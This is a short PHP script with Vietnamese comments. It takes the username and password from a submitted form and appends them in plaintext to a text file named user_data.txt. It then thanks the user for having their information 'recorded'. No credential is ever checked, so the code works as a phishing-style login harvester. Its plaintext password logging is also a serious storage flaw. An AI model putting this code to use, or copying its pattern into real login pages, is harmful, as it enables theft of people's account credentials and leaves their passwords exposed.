<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Lấy thông tin người dùng từ form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Định dạng thông tin để ghi vào file
    $data = "Username: " . $username . ":password: ".$password."\n";

    // Đường dẫn tới file nơi lưu thông tin người dùng
    $file = 'user_data.txt';

    // Ghi thông tin vào file
    file_put_contents($file, $data, FILE_APPEND);

    // Hiển thị thông báo sau khi đăng nhập thành công
    echo "Thông tin của bạn đã được ghi lại. Cảm ơn!";
}
?>
